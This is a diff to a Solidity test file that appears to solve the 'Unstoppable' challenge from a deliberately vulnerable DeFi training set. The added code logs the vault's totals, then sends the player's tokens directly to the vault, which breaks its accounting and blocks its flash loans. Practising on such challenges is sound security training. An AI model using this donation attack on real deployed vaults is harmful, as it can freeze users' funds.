@@ -90,8 +90,27 @@ contract UnstoppableChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        console.log("### test_unstoppable start ###");
+
+        console.log("");
+        console.log("#1 Before attack");
+        console.log("totalAssets in vault:", vault.totalAssets() / 1e18);
+        console.log("totalSupply in vault:", vault.totalSupply() / 1e18);
+
+        console.log("");
+        console.log("#2 Run attack");
+        uint256 _amount = token.balanceOf(player);
+        token.transfer(address(vault), _amount);
+
+        console.log("");
+        console.log("#3 After attack");
+        console.log("totalAssets in vault:", vault.totalAssets() / 1e18);
+        console.log("totalSupply in vault:", vault.totalSupply() / 1e18);
+
+        console.log("");
+        console.log("### test_unstoppable end ###");
     }
 
     /**
